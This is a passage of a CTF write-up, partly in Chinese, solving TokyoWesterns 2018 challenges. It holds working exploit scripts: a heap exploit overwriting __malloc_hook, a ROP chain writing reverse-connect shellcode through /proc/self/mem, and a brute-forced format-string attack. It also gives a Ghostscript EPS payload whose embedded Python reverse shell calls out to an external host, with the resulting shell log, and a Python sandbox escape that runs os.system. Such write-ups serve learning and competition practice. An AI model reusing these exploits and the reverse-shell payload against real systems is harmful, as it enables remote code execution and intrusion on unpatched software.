    buy('A'*(62-0x20),123)
    buy(p64(0xDEADBEEF11),0xe1)
    buy(name,123)
    grill(name,0)
    grill(name,1)
    eat(0)
    eat(1)
    buy('C'*39,123)
    eat(5)
    choice(1)
    ru("* ")
    ru("* ")
    heap_addr=raddr(6)-0x110
    lg("heap_addr",heap_addr)
    sla("&gt;&gt; ","Beef")
    sla("&gt;&gt; ",str(1))
    buy('C'*40+p64(heap_addr+0xb0),123)
    eat(5)
    buy(p64(heap_addr+0xd0),123)
    choice(1)
    ru("121")
    ru("* ")
    libc_addr=raddr(6)-0x3c4b78
    libc.address=libc_addr
    lg("Libc address",libc_addr)
    sla("&gt;&gt; ","Beef")
    sla("&gt;&gt; ",str(1))


    # create a 0x21 above malloc hook
    buy(p64(libc.symbols['__malloc_hook']-0x18),123)
    choice(1)
    k=ru('food na').split(' ')
    code=k[-3]
    num=(int(k[-2].split('n')[0][1:-1]))
    left=0x100000000-num-0x1
    sla("&gt;&gt; ",code)
    sla("&gt;&gt; ",str(0x1))
    while(left&gt;0):
        if(left&lt;0x7FFFFFFF):
            buy(code,left+0x21)
            break
        else:
            buy(code,0x7FFFFFFF)
            left-=0x7FFFFFFF
    buy(p64(heap_addr+0xd0),123)
    buy(p64(heap_addr+0x10),123)

    buy('a'*0x10+p64(0xDEADBEEF11),0x31)
    buy(p64(0xDEADBEEF11),0x31)
    buy('fuck1',0x31)
    buy('C'*40+p64(heap_addr+0x1e0),123)
    eat(5)
    grill('Beef',0)
    eat(0)


    # fake a food structure in main_arena
    buy(p64(0xDEADBEEF11),0xb1)
    buy('k'*0x2+p64(heap_addr+0x10),123)
    buy('c'*0x1+p64(0xDEADBEEF11),123)
    buy(p64(libc.symbols['__malloc_hook']+0x10),123)
    buy('C'*40+p64(heap_addr+0x2c0),123)
    eat(5)
    buy("H"*0x10+p64(heap_addr+0x390),123)
    grill('',0)
    eat(0)


    ## modify fastbin[1]'s first pointer to point to a little above malloc hook
    left=0x100000000-0x210
    while(left&gt;0):
        if(left&lt;0x7FFFFFFF):
            buy(p64(heap_addr+0x150),left)
            break
        else:
            buy(p64(heap_addr+0x150),0x7FFFFFFF)
            left-=0x7FFFFFFF


    grill("H"*0x10+p64(heap_addr+0x390),1)
    eat(1)
    oneshot=libc.address+0x4526a
    buy(cyclic(0x8)+p64(oneshot),123)
    grill(p64(heap_addr+0x150).ljust(64,'x00'),1)
    p.interactive()
```



## load | Pwn

题目让输入一个文件，然后输入一个offset和size，之后会通过一个函数将这个文件加载到栈上，加载之后close 了0 1 2 三个fd，由于没有开启canary，所以可以进行栈溢出，于是思考到要想办法控制这个输入，所以通过/proc/self/fd/0进行读取，则会读取stdin，于是可以进行read tdin，进而进行rop。

但是由于关闭了stdin，stdout，stderr，且测试了/dev/tty发现没有该文件，且不知道flag是啥名字，所以需要进行反连。但是直接rop反连由于没有提供libc，且没有能够syscall的部分，所以直接rop反连比较麻烦，这个时候想到可以写/proc/self/mem，但是由于没有write函数，所以需要通过puts函数来写，通过控制/proc/self/mem的fd为1，则puts将会输出到mem，将shellcode写到text里，跳转执行即可。

```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

DEBUG = 0
if DEBUG:
    p = process('./load')
else:
    p = remote('pwn1.chal.ctf.westerns.tokyo', 34835)

SHELLCODE = "x68x76xbex45x25x66x68xd4xacx66x6ax02x6ax2ax6ax10x6ax29x6ax01x6ax02x5fx5ex48x31xd2x58x0fx05x48x89xc7x5ax58x48x89xe6x0fx05x48x31xf6xb0x21x0fx05x48xffxc6x48x83xfex02x7exf3x48x31xc0x48xbfx2fx2fx62x69x6ex2fx73x68x48x31xf6x56x57x48x89xe7x48x31xd2xb0x3bx0fx05x00";


def main():
    filename_start = 0x601040
    pop_rdi_ret = 0x400a73
    pop_rsi_r15_ret = 0x400a71
    open_at_plt = 0x400710
    lseek_at_plt = 0x4006d8
    puts_at_plt = 0x4006c0
    atoi_at_plt = 0x400718
    write_to = 0x400817
    pops_ret = 0x400a6a
    movs_call = 0x400a51
    lseek_at_got = 0x600fb8

    raw_input()
    p.recvuntil('Input file name:')
    fd_name = '/proc/self/fd/0'
    mem_name = '/proc/self/mem'
    payload = fd_name + 'x00' + mem_name + 'x00'
    shellcode_at_num = len(payload)
    payload += SHELLCODE
    pos_at_num = len(payload)
    payload += "1x00"
    rop_at_num = len(payload)
    #payload += p64(pop_rdi_ret)
    #payload += p64(filename_start + shellcode_at_num)
    #payload += p64(puts_at_plt)
    #payload += p64(0x400816)
    p.sendline(payload)
    p.recvuntil('Input offset:')
    p.sendline('0')


    payload = 'a' * (56 - 8) + p64(filename_start + rop_at_num)
    payload += p64(pop_rdi_ret)
    payload += p64(filename_start + len(fd_name) + 1) # rdi = "/proc/self/mem"
    payload += p64(pop_rsi_r15_ret)
    payload += p64(0)
    payload += p64(0) # rsi = r15 = 0
    payload += p64(open_at_plt) # open("/proc/self/mem", 2) -&gt; fd = 0
    payload += p64(pop_rdi_ret)
    payload += p64(filename_start + len(fd_name) + 1)
    payload += p64(pop_rsi_r15_ret)
    payload += p64(2)
    payload += p64(0) # rsi = r15 = 0
    payload += p64(open_at_plt) # open("/proc/self/mem", 2) -&gt; fd = 1
    payload += p64(pops_ret)
    payload += p64(0) # rbx + 1 == rbp -&gt; edx
    payload += p64(1) # rbp
    payload += p64(lseek_at_got) # r12 call r12 + rbx * 8
    payload += p64(0) # r13
    payload += p64(write_to) # r14 -&gt; rsi
    payload += p64(1) # r15 (r15d) -&gt; edi
    payload += p64(movs_call)
    payload += p64(0) # dummy
    payload += p64(0) # rbx after
    payload += p64(0) # rbp after
    payload += p64(0) # r12 after
    payload += p64(0) # r13 after
    payload += p64(0) # r14 after
    payload += p64(0) # r15 after
    payload += p64(pop_rdi_ret)
    payload += p64(filename_start + shellcode_at_num)
    payload += p64(puts_at_plt)
    payload += p64(write_to)



    p.recvuntil('size: ')
    p.sendline(str(len(payload)))

    p.send(payload)

    p.interactive()


if __name__ == '__main__':
    main()
```



## neighbor_c | Pwn

题目逻辑比较简单，两次call函数，之后进行不停的fgets 0x100到stderr，然后fprintf。<br>
（以下为把sleep patch后的调试版本，原函数在while中，fprintf后会sleep 1秒，且在进入时会sleep3秒）<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ob2hrvcxg.bkt.clouddn.com/20180905013004.png)<br>
stderr是通过参数传入的。<br>
所以可以往栈上已经有的位置写东西，然后由于两次call函数，所以存在多个指向栈上的指针，这样就可以通过partial write（写一个字节的方式）来控制一个指向栈上的指针指向栈上想要改动的东西。（但由于栈最后一个字节存在变动，所以需要16次爆破）<br>
这样的话，就可以通过改动栈上的fileptr，使其指向stdout，从而得到leak的地址。<br>
得到leak的地址之后，就可以通过先改动指向栈上指针的低地址从而改动栈上任意位置的值，之后可以利用栈上被任意改动的值来做到任意写，把one gadget写入malloc hook，通过触发fprintf时的malloc来getshell。（但由于libc里stdout结构体位于X600，而stderr位于X520，这个X没法确定，所以需要半个字节，也就是16次爆破）<br>
最终我们需要16 × 16 = 256次爆破，还算是可以接受的范围，因为有sleep 3秒。<br>
（我的exp是一开始错误的思路，试图改写vtable来bypass 2.24的check，但是由于触发overflow需要0x2000个字节的输入，明显这题做不到，所以失败了，但是调试过程发现malloc触发了，所以直接改动了，把写vtable改成了写malloc hook getshell的，所以比较混乱）<br>
（下次有爆破记得cat fla*。。搞得我爆破了好几次）

```
from pwn import *
import os
context(os='linux', arch='amd64', log_level='debug')

DEBUG = 0
libc = ELF('libc.so.6')
if DEBUG:
    #p = process('./neighbor_c', env=`{`'LD_PRELOAD': os.getcwd() + '/libc.so.6'`}`)
    #p = remote('localhost', 12121)
    pass
else:
    #p = remote('neighbor.chal.ctf.westerns.tokyo', 37565)
    pass

def main(p, base, halfbyte):
    if DEBUG:
        raw_input()
    p.recvuntil('mayor.')
    p.sendline('dtj')
    if DEBUG:
        base = int(raw_input('base number'), 16)
    value = base + 0x18
    p.sendline('%`{``}`c%9$hhn'.format(value));
    if DEBUG:
        half_byte = int('0x`{``}`600'.format(raw_input('stdout half byte number').strip()), 16)
    else:
        half_byte = int('0x`{``}`600'.format(halfbyte), 16)
    p.sendline('%`{``}`c%11$hn'.format(half_byte))

    p.sendline('anciety%lx %lx %lx %lx %lx %lx %lx')
    if DEBUG:
        p.recvuntil('anciety')
    else:
        p.recvuntil('anciety', timeout=4)
        #p.recvuntil('anciety', timeout=3)
    line = p.recvline().strip().split()
    p.info(line)
    libc_base = int(line[4], 16) - (0x7f1b5b0a6520 - 0x00007f1b5ace4000)
    p.info('get libc base %lx' % libc_base)

    stderr_struct = libc_base + libc.symbols['_IO_2_1_stderr_']
    #stderr_struct = libc_base + (0x7ffc9f055e00 - 0x00007f31f5233000)
    stderr_vtable = stderr_struct + 0xe0 - 8
    wstr_jump_table = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x248

    # modify things back
    p.sendline('%`{``}`c%9$hhn'.format(base + 0x18))
    stderr_last_two = u16(p64(libc_base + libc.symbols['_IO_2_1_stderr_'])[:2])
    p.sendline('%`{``}`c%11$hn'.format(stderr_last_two))

    # change fp+0xe0 to one_gadget
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    newip_at = malloc_hook
    one_gadget = libc_base + 0xf24cb
    new_ip_packed = p64(newip_at)

    # points to libc value
    p.sendline('%`{``}`c%9$hhn'.format(base))
    p.sendline('%`{``}`c%11$hn'.format(u16(p64(newip_at)[:2])))
    '''
    # modify libc value to fp+0xe0
    x = 0
    for i in new_ip_packed[:4]:
        x += 1
        p.sendline('%`{``}`c%11$hhn'.format(ord(i)))
        # points to next value to modify
        p.sendline('%`{``}`c%9$hhn'.format(base + x))
    '''

    # modify fp+0xe0+8 to one_gadget now
    p.info('modify %x to %x' % (newip_at, one_gadget))
    x = 0
    for i in p64(one_gadget)[:6]:
        x += 1
        p.sendline('%`{``}`c%5$hhn'.format(ord(i)))
        p.sendline('%`{``}`c%11$hhn'.format(ord(new_ip_packed[0]) + x))

    # points to libc value
    p.sendline('%`{``}`c%9$hhn'.format(base))
    p.info('modify %x to %x' % (stderr_vtable, wstr_jump_table))
    # modify libc value to stderr's vtable
    x = 0
    stderr_vtable_packed = p64(stderr_vtable)
    for i in stderr_vtable_packed[:6]:
        x += 1
        p.sendline('%`{``}`c%11$hhn'.format(ord(i)))
        p.sendline('%`{``}`c%9$hhn'.format(base + x))

    x = 0
    if False:
        p.sendline('break me')
        p.recvuntil('break me')
        raw_input('break me')
    p.sendline('%`{``}`c%9$hhn'.format(base))
    p.sendline('%`{``}`c%5$hn'.format(u16(p64(wstr_jump_table)[:2])))
    p.sendline('%40000c')

    p.recv()
    p.sendline('echo wtf')
    try:
        p.recvuntil('wtf', timeout=3)
    except:
        return False
    p.sendline('ls')
    p.recv()
    p.sendline('cat flag')
    p.interactive()
    return True

def bruteforce():
    if DEBUG:
        p = remote('localhost', 12121)
        main(p, '10', 'a')
        return
    while True:
        try:
            with remote('neighbor.chal.ctf.westerns.tokyo', 37565) as p:
            #with remote('localhost', 12121) as p:
                if main(p, 0x10, 'a'):
                    return
        except KeyboardInterrupt as e:
            raise e
        except:
            pass


if __name__ == '__main__':
    bruteforce()
```



## welcome |Misc

签到题



## dec dec dec | reverse

一次base64，一次rot13，一次魔改base64，解密即可。



## mondai.zip | misc

First password: y0k0s0 (filename is y0k0s0.zip)<br>
Second password: We1come (bytearray of char(192.168.11.5 echo request size))<br>
Third password: eVjbtTpvkU ([i for i in file(“list.txt”).read().split(‘n’)] and bruteforce)<br>
Forth password: happyhappyhappy (1c9ed78bab3f2d33140cbce7ea223894 md5 hash crack)<br>
Fifth password: to (bruteforce zip file)<br>
TWCTF`{`We1come_to_y0k0s0_happyhappyhappy_eVjbtTpvkU`}`



## vimshell | misc

chrome -app=[https://vimshell.chal.ctf.westerns.tokyo](https://vimshell.chal.ctf.westerns.tokyo)

Ctrl + W -&gt; :! cat /flag<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://up.harold.kim/k9iLqQqVVs8NL1Ht)



## slack emoji converter | web

We can get the sourcecode just by looking at the sourcecode of the index page.<br>
&lt;!– &lt;a href=”/source”&gt;source&lt;/a&gt; –&gt; shows the following data :-

```
from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
from PIL import Image
import tempfile
import os


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "`{``}`.`{``}`".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_`{``}`'.format(f.filename)
    os.unlink(fname)
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
```

Well, as you noticed, the code itself is not vulnerable. But if you ever noticed, it uses the PIL library which has been known to have RCEs by maliciously crafting image ([CVE-2017-8291](https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291)).<br>
However, this CVE-2017-8291 is outdated. This CTF is running in September 2018. Many of people should’ve been stuck here.<br>
I’ve been searching on google and found this interesting [issue request](http://seclists.org/oss-sec/2018/q3/142) that was written in seclists.org last month.<br>
But Just copy and pasting the PoC does not give you the flag. You need to craft it a little further and make it suitable for the challenge server to recognize the file.<br>
(But seriously, this challenge is a 1day exploit challenge and this 1day is not assigned by CVE yet. How awesome is that?)<br>
In my case, I used the following ghostscript file and uploaded it onto the server.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 30 30

userdict /setpagedevice undef
save
legal
`{` null restore `}` stopped `{` pop `}` if
`{` legal `}` stopped `{` pop `}` if
restore
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("harold.kim",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

The result? well…

```
root@imouto-router:/# nc -vlp 8080
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 45.123.200.35.bc.googleusercontent.com 53674 received!
/bin/sh: 0: can't access tty; job control turned off
$ cat /flag
TWCTF`{`watch_0ut_gh0stscr1pt_everywhere`}`$ id
uid=1000(emoji) gid=1000(emoji) groups=1000(emoji)
$ exit
root@imouto-router:/#
```



## py sandbox | misc

The objective of this challenge is nothing but to bypass the ast filters and execute the flag.<br>
In this challenge, I used the following payload to solve both challenges.

```
pysandbox1: [1,2,3,4][1:__import__("os").system("cat flag")]
pysandbox2: [1,2,3,4][1:__import__("os").system("cat flag2")]
```

How it works?<br>
First we need to look at what kind of attributes are checked within the check() function.

```
'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt', 'generators'],
            'SetComp': ['elt', 'generators'],
            'DictComp': ['key', 'value', 'generators'],
            'GeneratorExp': ['elt', 'generators'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node 
            'comprehension': ['target', 'iter', 'ifs'],
```

And this check() is run recursively so you can’t even use any of above ast types.<br>
My approach was to analyze the ast attributes from the input by dumping the parsed variables ast.dump(ast.parse(stdin))`<br>
So I modified a bit of the challenge script to start debugging..

```
root@stypr-200109:~# python x.py
[1,2,3]
Module(body=[Expr(value=List(elts=[Num(n=1), Num(n=2), Num(n=3)], ctx=Load()))])
```

Above code obviously works because it meets the criteria.

```
root@stypr-200109:~# python x.py
[1,2,3,4][1:__import__('os').system('ls')]
Module(body=[Expr(value=Subscript(value=List(elts=[Num(n=1), Num(n=2), Num(n=3), Num(n=4)], ctx=Load()), slice=Slice(lower=Num(n=1), upper=Call(func=Attribute(value=Call(func=Name(id='__import__', ctx=Load()), args=[Str(s='os')], keywords=[], starargs=None, kwargs=None), attr='system', ctx=Load()), args=[Str(s='ls')], keywords=[], starargs=None, kwargs=None), step=None), ctx=Load()))])
&lt;class '_ast.Expr'&gt;
&lt;class '_ast.Subscript'&gt;
&lt;class '_ast.List'&gt;
&lt;class '_ast.Num'&gt;
&lt;class '_ast.Num'&gt;
&lt;class '_ast.Num'&gt;
&lt;class '_ast.Num'&gt;
x.py flag
```

Well, as you’ve seen, Slice is not included in the attribute check. So this literally bypasses the check() function.<br>
exploiting this slice gives the flag :-

```
root@stypr-200109:~# echo -e '[1,2,3,4][1:__import__("os").system("cat flag")]' | nc -v4 pwn1.chal.ctf.westerns.tokyo 30001
Connection to pwn1.chal.ctf.westerns.tokyo 30001 port [tcp/*] succeeded!
TWCTF`{`go_to_next_challenge_running_on_port_30002`}`
[]root@stypr-200109:~# cat a.txt | nc -v4 pwn1.chal.ctf.westerns.tokyo 30002 | tail -3 
Connection to pwn1.chal.ctf.westerns.tokyo 30002 port [tcp/*] succeeded!
    sys.stdout.flush()
TWCTF`{`baby_sandb0x_escape_with_pythons`}`
[]root@stypr-200109:~#
```



## BBQ old | pwn

与BBQ 相同。
